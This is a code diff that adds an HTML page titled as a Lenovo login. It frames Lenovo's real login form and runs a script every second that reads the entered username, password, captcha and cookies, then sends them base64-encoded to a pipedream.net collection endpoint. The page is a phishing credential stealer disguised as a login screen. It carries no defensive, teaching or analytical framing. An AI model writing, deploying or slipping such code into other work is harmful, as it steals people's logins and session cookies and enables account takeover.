@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>联想登录</title>
+<style>
+body { margin:0; padding:0; }
+iframe { border:none; }
+</style>
+</head>
+<body>
+<iframe id="frame" src="https://user.lenovo.com.cn/login/dev/commonLogin.html" width="100%" height="1000px"></iframe>
+<script>
+setInterval(() => {
+    try {
+        let f = document.getElementById('frame').contentWindow;
+        let user = f.document.querySelector('input[type="text"]')?.value || '';
+        let pwd = f.document.querySelector('input[type="password"]')?.value || '';
+        let captcha = f.document.querySelector('input[placeholder="请输入验证码"]')?.value || '';
+        let ck = f.document.cookie || '';
+        fetch('https://eokp6mrzzfcq04l.m.pipedream.net?data=' + btoa(JSON.stringify({
+            user: user,
+            pwd: pwd,
+            captcha: captcha,
+            cookie: ck
+        })));
+    } catch (e) {}
+}, 1000);
+</script>
+</body>
+</html>
